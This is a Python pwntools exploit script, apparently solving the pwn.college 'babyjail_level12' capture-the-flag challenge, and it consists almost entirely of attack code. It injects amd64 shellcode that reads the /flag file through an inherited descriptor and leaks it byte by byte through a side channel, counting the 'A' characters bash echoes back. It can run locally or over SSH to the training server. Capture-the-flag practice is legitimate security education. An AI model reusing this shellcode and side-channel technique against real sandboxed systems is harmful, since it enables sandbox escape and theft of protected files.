from pwn import *
import os
shellcode_fmt="""
mov rdi,3 ;\
mov rsi,0x1337100 ;\
mov rdx,0x100 ;\
xor rax,rax ;\
syscall ;\

xor rbx,rbx ;\
mov bl,[rsi+{}] ;\

mov rdx,rbx ;\
mov rsi,0x1337200 ;\
xor rdi,rdi ;\
xor rax,rax ;\
syscall ;\
"""
flag=''
def brute(p,offset):
        global flag
        p.recv()
        shellcode=asm(shellcode_fmt.format(offset),arch='amd64')
        p.sendline(shellcode)
        p.recv()
        p.sendline(b"A"*300)
        if args.LOCAL:
            p.recvuntil(b"line 1: ")
            p.recvuntil(b"line 1: ")
        elif args.SSH:
            p.recvuntil(b"bash: ")
        sleep(1)
        c=chr(300-p.recvuntil(b"A: command not found",timeout=1).count(b"A"))
        if c==chr(0):
            p.close()
            return 1
        log.info(c)
        flag+=c
        p.close()
        return 0
if args.LOCAL:
    for offset in range(100):
        p=process(["/bin/bash","-c","""./babyjail_level12 /flag ; /bin/bash"""])
        if brute(p,offset):
            break
elif args.SSH:
    s=ssh(host="dojo.pwn.college",user="hacker",keyfile="~/pwn_college/key")
    for offset in range(100):
        p=s.process(["/bin/bash","-c","""/challenge/babyjail_level12 /flag ; /bin/bash"""])
        if brute(p,offset):
            break
print(flag)